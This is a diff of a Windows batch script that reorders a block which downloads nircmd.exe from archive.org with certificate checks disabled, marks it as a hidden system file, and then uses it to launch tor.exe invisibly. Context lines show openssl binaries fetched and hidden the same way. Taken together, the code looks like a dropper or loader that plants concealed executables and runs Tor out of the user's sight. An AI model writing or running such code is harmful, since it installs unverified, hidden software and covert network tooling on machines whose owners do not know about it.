@@ -30,6 +30,12 @@ attrib -s -h -i "%environment%\openssl.exe" && if exist "%environment%\openssl.e
    "%environment%\curl.exe" -k -L https://indy.fulgan.com/SSL/Archive/openssl-1.0.2-i386-win32.zip -o "%temp%\openssl.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\openssl.zip" -o"%environment%" openssl.exe libeay32.dll ssleay32.dll -y && attrib +s +h +i "%environment%\openssl.exe" && attrib +s +h +i "%environment%\libeay32.dll" && attrib +s +h +i "%environment%\ssleay32.dll"
 )
 
+attrib -s -h -i "%environment%\nircmd.exe" && if exist "%environment%\nircmd.exe" (
+   "%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
+) else (
+"%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
+)
+
 attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
     attrib +s +h +i "%environment%\tor.exe"
 ) else (
@@ -39,12 +45,6 @@ attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (echo) else (
   "%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
-)
-
-attrib -s -h -i "%environment%\nircmd.exe" && if exist "%environment%\nircmd.exe" (
-   "%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
-) else (
-"%environment%\curl.exe" -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
 )
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
